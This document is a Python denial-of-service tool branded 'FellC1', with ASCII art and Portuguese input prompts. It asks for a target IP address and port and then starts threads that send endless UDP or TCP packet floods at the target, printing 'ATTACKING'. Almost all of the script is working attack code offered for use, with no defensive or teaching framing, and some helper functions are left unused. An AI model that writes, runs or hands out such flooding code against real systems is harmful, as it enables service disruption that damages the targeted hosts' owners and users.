#!/usr/bin/env python3
import pyfiglet
import socket
import threading
import os
import time
import random

os.system("clear")
os.system("clear")
os.system("clear")
print("\x1b[93m⠀⠀⠀⠀⠀⢀⡴⠋⠉⠛⠒⣄⠀⠀⠀⠀⠀⠀")
time.sleep(0.2)
print("⠀⠀⠀⠀⢸⠏⠀⠀⣶⡄⠀⠀⣛⠀⠀⠀⠀⠀")
time.sleep(0.2)
print("⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⡤⠋⠠⠉⠡⢤⢀⠀")
time.sleep(0.2)
print("⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⢉⣝⠲⠤⣄⣀⣀⠌")
time.sleep(0.2)
print("⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀")
time.sleep(0.2)
print("⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀")
time.sleep(0.2)
print("⢀⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀")
time.sleep(0.2)
print("⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀")
time.sleep(0.2)
os.system("pyfiglet FellC1")
IP = input("IP: ")
PORT = int(input("PORTA: "))
threads = 18
times = 10000

def randomip():
    randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return randip

data = bytes.fromhex("AA AA AA AA")

def udp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((IP, PORT))
            print(f"ATTACKING {IP} {PORT}")
            for _ in range(times):
                s.send(data)
            s.close()
        except:
            print("Connection error")

def udp_flood2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(IP), int(PORT))
            for _ in range(times):
                s.sendto(data, addr)
            s.close()
        except:
            print("Connection error")

def tcp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            addr = (str(IP), int(PORT))
            s.connect(addr)
            for _ in range(times):
                s.send(data)
            s.close()
        except:
            print("Connection error")

for _ in range(threads):
    choice = input("Use UDP (y/n): ")
    if choice == 'y':
        th = threading.Thread(target=udp_flood)
        th.start()
    else:
        th = threading.Thread(target=tcp_flood)
        th.start()
